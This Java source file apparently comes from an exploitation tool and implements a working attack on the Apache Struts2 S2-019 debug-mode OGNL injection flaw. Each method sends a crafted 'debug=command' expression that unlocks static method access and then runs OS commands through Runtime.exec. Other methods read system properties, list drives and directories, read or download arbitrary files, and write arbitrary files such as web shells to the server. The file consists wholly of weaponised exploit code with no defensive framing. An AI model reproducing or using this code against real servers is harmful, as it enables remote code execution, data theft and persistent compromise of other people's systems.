package org.vti.service.impl;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;

import org.vti.service.ExploitService;
import org.vti.util.RequestUtil;

public class Struts2_S019_ExploitServiceImpl implements ExploitService{

	@Override
	public String getRealPath(String uri) throws Exception {
		String commandURL = URLEncoder
				.encode("#req=@org.apache.struts2.ServletActionContext@getRequest(),"
						+ "#resp=@org.apache.struts2.ServletActionContext@getResponse(),"
						+ "#path=#req.getSession().getServletContext().getRealPath(\"/\")",
						"UTF-8");

		String requestURL = uri+ "?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29,"+ commandURL;
		
		StringBuffer buf=new StringBuffer("\u7269\u7406\u5730\u5740\uff1a");
		
		buf.append(RequestUtil.getInstance().doRequest(requestURL));

		return buf.toString();
	}

	@Override
	public Map<String, String> getServerInfo(String uri,
			Map<String, String> properties) throws Exception {
	
		Map<String, String>echo=new LinkedHashMap<String,String>();
		
		for (Entry<String, String> entry:properties.entrySet()) {
			
			String commandURL = URLEncoder.encode("#property=@java.lang.System@getProperty(\""+entry.getValue()+"\")","UTF-8");
			
			String requestURL = uri + "?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29," + commandURL;
			
			echo.put(entry.getKey(),RequestUtil.getInstance().doRequest(requestURL));
		}
		
		return echo;
		
	}

	@Override
	public String doExecuteCMD(String uri, String cmd) throws Exception {
		
		String commandURL = URLEncoder.encode("#a=@java.lang.Runtime@getRuntime().exec('"+cmd+"')," +
				"#s=new java.util.Scanner(#a.getInputStream()).useDelimiter(\"\\\\A\")," +
				"#msg=(#s.hasNext() ? #s.next() : \"\"),"+
				"#msg=#msg.trim()","UTF-8");
		
		String requestURL = uri + "?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29," + commandURL;
		
		BufferedReader reader=new BufferedReader(new InputStreamReader(RequestUtil.getInstance().getInputStream(requestURL)));
		
		String str="";
		while (reader.ready()) {
			str+=reader.readLine()+"\r\n";
		}
		return str;
	}

	@Override
	public boolean doUpload(String uri, String fileName, String content)
			throws Exception {
		
		fileName="/"+fileName;
		content=content.replace("\"","\\\"");
		
		String commandURL = URLEncoder.encode("#req=@org.apache.struts2.ServletActionContext@getRequest()," +
				"#resp=@org.apache.struts2.ServletActionContext@getResponse(),"+
				"#path=#req.getSession().getServletContext().getRealPath(\"/\"),"+
				"#content=new java.lang.String(\""+content+"\")," +
				"#file=new java.io.File(#path +\""+fileName+"\")," +
				"#fos=new java.io.FileOutputStream(#file)," +
				"#fos.write(#content.getBytes())," +
				"#fos.flush()," +
				"#fos.close(),"+
				"#resp.getWriter().println(\"ok\")," +
				"#resp.getWriter().flush(),"+
				"#resp.getWriter().close()","UTF-8");
		
		String requestURL = uri+"?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29," + commandURL;
		
		String message=RequestUtil.getInstance().doRequest(requestURL);
		
		if (message.equals("ok")) {
			return true;
		}else {
			return false;
		}
	}

	@Override
	public boolean doCustomUplaod(String uri, String filePath, String content)
			throws Exception {
		
		String commandURL = URLEncoder.encode("#req=@org.apache.struts2.ServletActionContext@getRequest()," +
				"#resp=@org.apache.struts2.ServletActionContext@getResponse(),"+
				"#path=new java.lang.String(\""+filePath.trim()+"\")," +
				"#content=new java.lang.String(\""+content+"\")," +
				"#file=new java.io.File(#path)," +
				"#fos=new java.io.FileOutputStream(#file)," +
				"#fos.write(#content.getBytes())," +
				"#fos.flush()," +
				"#fos.close(),"+
				"#resp.getWriter().println(\"ok\")," +
				"#resp.getWriter().flush(),"+
				"#resp.getWriter().close()","UTF-8");
		
		String requestURL = uri+"?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29," + commandURL;
		
		String message=RequestUtil.getInstance().doRequest(requestURL);
		
		if (message.equals("ok")) {
			return true;
		}else {
			return false;
		}
	}

	@Override
	public List<String> doGetFileSystem(String uri) throws Exception {
		
		String commandURL = URLEncoder.encode("#sys=@java.io.File@listRoots()," +
				"#resp=@org.apache.struts2.ServletActionContext@getResponse(),"+
				"#resp.getWriter().println(#sys.length)," +
				"#resp.getWriter().flush()," +
				"#resp.getWriter().close()","UTF-8");
		
		String requestURL = uri+"?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29," + commandURL;
		
		int size=Integer.valueOf(RequestUtil.getInstance().doRequest(requestURL));
		
		List<String>list=new ArrayList<String>();
		
		for (int i = 0; i <size; i++) {
			
			String diskCmdURL = URLEncoder.encode("#sys=@java.io.File@listRoots()," +
					"#resp=@org.apache.struts2.ServletActionContext@getResponse(),"+
					"#resp.getWriter().println(#sys["+i+"])," +
					"#resp.getWriter().flush()," +
					"#resp.getWriter().close()","UTF-8");
			
			String diskURL = uri+"?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29," + diskCmdURL;
			
			String diskName= RequestUtil.getInstance().doRequest(diskURL);
			
			list.add(diskName);
		}
		
		return list;
		
	}

	@Override
	public List<String> doListFiles(String uri, String path) throws Exception {
		
		String commandURL = URLEncoder.encode("#resp=@org.apache.struts2.ServletActionContext@getResponse(),"+
				"#file=new java.io.File(\""+path+"\")," +
				"#resp.getWriter().println(#file.listFiles().length)," +
				"#resp.getWriter().flush()," +
				"#resp.getWriter().close()","UTF-8");
		String requestURL = uri+"?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29," + commandURL;
		
		int size=Integer.valueOf(RequestUtil.getInstance().doRequest(requestURL));
			
		List<String>list=new ArrayList<String>();
		
		for (int i = 0; i <size; i++) {
			
			String diskCmdURL = URLEncoder.encode("#resp=@org.apache.struts2.ServletActionContext@getResponse(),"+
					"#file=new java.io.File(\""+path+"\")," +
					"#resp.getWriter().println(#file.listFiles()["+i+"].getName())," +
					"#resp.getWriter().flush()," +
					"#resp.getWriter().close()","UTF-8");
			
			String diskURL = uri+"?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29," + diskCmdURL;
			
			String diskName= RequestUtil.getInstance().doRequest(diskURL);
			
			list.add(diskName);
		}
		
		return list;
	
	}

	@Override
	public String doGetFileContent(String uri, String path) throws Exception {
		
		String commandURL = URLEncoder.encode("#req=@org.apache.struts2.ServletActionContext@getRequest()," +
				"#resp=@org.apache.struts2.ServletActionContext@getResponse(),"+
				"#path=new java.lang.String(\""+path.trim()+"\")," +
				"#file=new java.io.File(#path)," +
				"#dis=new java.io.DataInputStream(new java.io.FileInputStream(#file)),"+
				"#length=#file.length(),"+
				"#buf=new byte[#length]," +
				"#dis.readFully(#buf),"+
				"#resp.getWriter().println(new java.lang.String(#buf,\"ISO-8859-1\"))," +
				"#resp.getWriter().flush(),"+
				"#resp.getWriter().close()","UTF-8");
		
		String requestURL = uri+"?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29," + commandURL;
		
		InputStream inputStream=RequestUtil.getInstance().getInputStream(requestURL);
		
		BufferedReader reader=new BufferedReader(new InputStreamReader(inputStream));
		
		StringBuffer buf=new StringBuffer();
		String str = "";
		while ((str = reader.readLine()) != null) {
			buf.append(str+"\r\n");
		}
		reader.close();
		
		return buf.toString();
	}

	@Override
	public boolean doIsDirectory(String uri, String path) throws Exception {
		
		String commandURL = URLEncoder.encode("#req=@org.apache.struts2.ServletActionContext@getRequest()," +
				"#resp=@org.apache.struts2.ServletActionContext@getResponse(),"+
				"#path=new java.lang.String(\""+path.trim()+"\")," +
				"#file=new java.io.File(#path)," +
				"#resp.getWriter().println(#file.isDirectory())," +
				"#resp.getWriter().flush(),"+
				"#resp.getWriter().close()","UTF-8");
		
		String requestURL = uri+"?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29," + commandURL;
		
		String message=RequestUtil.getInstance().doRequest(requestURL);
		
		return Boolean.parseBoolean(message);
	}

	@Override
	public InputStream doDownload(String uri, String rpath) throws Exception {
		
		String commandURL = URLEncoder.encode("#req=@org.apache.struts2.ServletActionContext@getRequest()," +
				"#resp=@org.apache.struts2.ServletActionContext@getResponse(),"+
				"#path=new java.lang.String(\""+rpath.trim()+"\")," +
				"#file=new java.io.File(#path)," +
				"#dis=new java.io.DataInputStream(new java.io.FileInputStream(#file)),"+
				"#length=#file.length(),"+
				"#buf=new byte[#length]," +
				"#dis.readFully(#buf),"+
				"#resp.getWriter().println(new java.lang.String(#buf,\"ISO-8859-1\"))," +
				"#resp.getWriter().flush(),"+
				"#resp.getWriter().close()","UTF-8");
		
		String requestURL = uri+"?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29," + commandURL;
		
		InputStream inputStream=RequestUtil.getInstance().getInputStream(requestURL);
		
		return inputStream;
		
	}
}
